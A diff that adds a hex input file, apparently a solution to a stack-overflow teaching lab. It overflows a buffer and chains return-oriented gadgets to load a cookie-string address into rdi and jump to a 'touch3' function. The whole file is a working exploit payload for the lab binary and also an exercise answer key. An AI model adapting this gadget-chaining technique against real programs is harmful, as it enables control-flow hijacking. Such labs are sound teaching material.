@@ -1,0 +1,25 @@
+/* fill the buffer */ 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+
+/* pop cookie address (next instruction) into rax */
+2b 1a 40 00 00 00 00 00
+
+/* cookie address */
+38 ac 61 55 00 00 00 00
+
+/* mov rax into rdi */
+22 1a 40 00 00 00 00 00
+
+/* address of touch3 */
+78 19 40 00 00 00 00 00
+
+/* cookie padding */ 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+
+/* cookie string */
+37 30 32 30 36 62 37 37 00 
